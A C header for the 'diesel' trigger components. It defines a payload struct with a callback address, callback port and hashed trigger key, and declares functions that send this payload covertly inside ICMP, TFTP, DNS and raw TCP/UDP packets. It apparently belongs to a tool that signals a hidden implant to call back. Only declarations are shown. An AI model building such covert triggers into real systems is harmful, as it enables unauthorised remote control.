/*!
 * trigger.h
 *
 * @version 0.1 (October 1, 2007)
 *
 * Header for the trigger components of diesel.
 * defined the payload of the trigger, an 8byte
 * struct. Also methods for encoding and decoding
 * the struct on the wire.
 *
 * @author Matt Bravo
 *
 */

#ifndef _TRIGGER_PROTOCOLS_H
#define _TRIGGER_PROTOCOLS_H

#include <stdio.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include "trigger_network.h"
#include "debug.h"

/* constants for use in switching on the different possible triggers to use */
#define T_PING_REQUEST	1
#define T_PING_REPLY	2
#define T_ICMP_ERROR	3
#define T_TFTP_WRQ	4
#define T_DNS_REQUEST	5
#define T_RAW_TCP	6
#define T_RAW_UDP	7

// Constants for building and encoding the raw TCP and UDP triggers
#define	MIN_PACKET_SIZE		126
#define	MAX_PACKET_SIZE		472
#define START_PAD		8
#define CRC_DATA_LENGTH		84
#define RANDOM_PAD1		200
#define RANDOM_PAD2		146
#define PAD1			8
#define PAD2			8

#define ID_KEY_HASH_SIZE	20	// Size of SHA-1 hash
#define ID_KEY_LENGTH_MIN	8	// Minimum character length for a trigger key

/*! \struct Payload
 *
 * 	\brief	Payload data structure
 *
 * 	\param in_addr_t callback_addr	- Call-back IP address
 * 	\param uint16_t callback_port	- Call-back port
 * 	\param uint8_t trigger_key	- Trigger key (SHA-1)
 * 	\param uint16_t crc		- CRC of payload
 */
typedef struct __attribute__((packed))
{
	uint8_t		seed;				// Obfuscation seed used for triggers other than raw TCP/UDP.
	in_addr_t	callback_addr;			// the callback for the triggered application, always in net order
	uint16_t	callback_port;			// callback port, passed to TBOT, always in net order
	unsigned char	triggerKey[ID_KEY_HASH_SIZE];	// ID Key hash
	uint16_t	crc;				// CRC of this payload
} Payload;

/*! \struct trigger_info
	\brief	The struct containing trigger control parameters
	
	\param Payload* p	- The 12 byte payload of the trigger
	\param trigger_info* ti	- The struct containing trigger-specific parameters
*/
typedef struct __attribute__((packed))
{
	uint32_t	trigger_type;			// one of the T_<trigger type> defined values
	in_addr_t	target_addr;			// the destination we are triggering, always in net order
	in_addr_t	callback_addr;			// the callback for the triggered application, always in net order
	uint16_t	callback_port;			// callback port, passed to TBOT, always in net order
	uint16_t	trigger_port;			// for raw triggers, the TCP or UDP port
	unsigned char	triggerKey[ID_KEY_HASH_SIZE];	// SHA-1 of ID key
	uint8_t		icmp_error_code;		// used for ICMP error triggers (the opcode of a payload)
} trigger_info;

// pretty print package
extern void print_payload (Payload * p);

extern void icmp_generic (ip_hdr * iph);

extern void
ping_generic (ip_hdr * ih, icmp_hdr * ich, uint8_t * data, uint32_t fillSZ);


/*!
	\brief	Sends an TFTP wrq trigger (1 packet, write request)
	
	\param Payload* p	- The 12 byte payload of the trigger
	\param trigger_info* ti	- The struct containing trigger-specific parameters
	
	\return	The success of the call.
	\retval	SUCCESS (0) success
	\retval	FAILURE (-1) failure
*/
extern int trigger_tftp_wrq (Payload * p, trigger_info * ti);

/*!
	\brief	Sends an ICMP ping trigger (6 packets in 6 seconds)
	
	\param Payload* p	- The 12 byte payload of the trigger
	\param trigger_info* ti	- The struct containing trigger-specific parameters
	
	\return		The success of the call.
	\retval         SUCCESS (0) success
	\retval         FAILURE (-1) failure
*/
extern int trigger_icmp_ping (Payload * p, trigger_info * ti);

/*!
	\brief	Sends an ICMP error trigger (1 packet, 15 different codes)
	
	\param Payload* p	- The 12 byte payload of the trigger
	\param trigger_info* ti	- The struct containing trigger-specific parameters
	
	\return		The success of the call.
	\retval         SUCCESS (0) success
	\retval         FAILURE (-1) failure
*/
extern int trigger_icmp_error (Payload * p, trigger_info * ti);

extern int trigger_dns_query (Payload * p, trigger_info * ti);

//int trigger_raw_udp (Payload * p, trigger_info * ti);

//int trigger_raw_tcp (Payload * p, trigger_info * ti);

unsigned int trigger_raw (Payload *p, trigger_info * ti);

extern int trigger_info_to_payload( Payload * p, trigger_info * ti);

#endif
